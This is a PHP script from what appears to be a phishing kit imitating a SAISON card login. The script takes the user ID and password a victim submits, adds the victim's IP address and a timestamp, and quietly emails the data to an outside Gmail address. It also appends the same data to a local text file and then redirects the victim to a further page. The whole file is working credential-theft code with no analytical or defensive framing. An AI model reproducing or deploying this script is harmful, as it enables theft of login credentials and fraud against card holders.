<?php   ob_start();  ?>
<?
include "Xc.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX SAISON Xx======\n";
$message .= "ID               : ".$_POST['j1']."\n";
$message .= "PASSWORD                  : ".$_POST['j2']."\n";
$message .= "============xX Majid NEXI Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="omex1231231@gmail.com";
$subject = "Login | ".$_POST['winners1']." | $ip";
$headers = "From: Kelly<noreply>";
@mail($send,$subject,$message,$from);
$file = fopen("../all.txt","a");
fwrite($file, $message);

@header("Location: ./index2.php");